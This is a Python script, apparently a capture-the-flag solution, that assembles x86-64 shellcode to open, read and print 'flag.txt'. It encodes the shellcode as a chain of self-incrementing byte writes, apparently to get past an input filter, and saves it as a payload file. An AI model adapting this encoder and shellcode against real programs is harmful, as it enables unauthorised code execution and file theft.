import os
os.chdir(os.path.dirname(__file__))

start = b"".join([
    b"\x5b", # pop rbx
    b"\x5b", # pop rbx
    b"\x5b", # pop rbx
    b"\x5b", # pop rbx
])

MOVE_PTR = b"\x80\xc3\x01" # add bl, 1
INC_VAL = b"\x80\x03\x01" # add byte ptr [rbx], 1

out_payload = bytearray(start)
emulated_payload = bytearray(start)
ext = lambda val: [out_payload.extend(val), emulated_payload.extend(val)]

code = [
    # b"\x48\x89\xec", # mov rsp, rbp (uncomment if rsp is misaligned, but it shouldnt be)
    b"\x6a\x00", # push 0x0
    b"\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74", # movabs rax, 0x78742e67616c662f
    b"\x50", # push rax
    b"\x54", # push rsp
    b"\x6a\x02", # push 2
    b"\x58", # pop rax
    b"\x5f", # pop rdi
    b"\x31\xf6", # xor esi, esi
    b"\x31\xd2", # xor edx, edx
    b"\x0f\x05", # syscall
    b"\x50", # push rax
    b"\x54", # push rsp
    b"\x5e", # pop rsi
    b"\x5f", # pop rdi
    b"\x31\xc0", # xor eax, eax
    b"\xb2\x7f", # mov dl, 0x7f
    b"\x0f\x05", # syscall
    b"\x89\xc2", # mov edx, eax
    b"\xb0\x01", # mov al, 1
    b"\x89\xc7", # mov edi, eax
    b"\x0f\x05", # syscall
    # b"\xf4", # hlt
]
GOAL = b"".join(code)

for i, c in enumerate(GOAL):
    while emulated_payload[i] != GOAL[i]:
        ext(INC_VAL)
        emulated_payload[i] = (emulated_payload[i] + 1) & 0xff
    
    if i != len(GOAL) - 1:
        ext(MOVE_PTR)

ext(
    b"\xc3" # ret
)

print(hex(len(out_payload)))
print(out_payload[:20])
with open("payload3.bin", "wb") as f:
    f.write(out_payload)
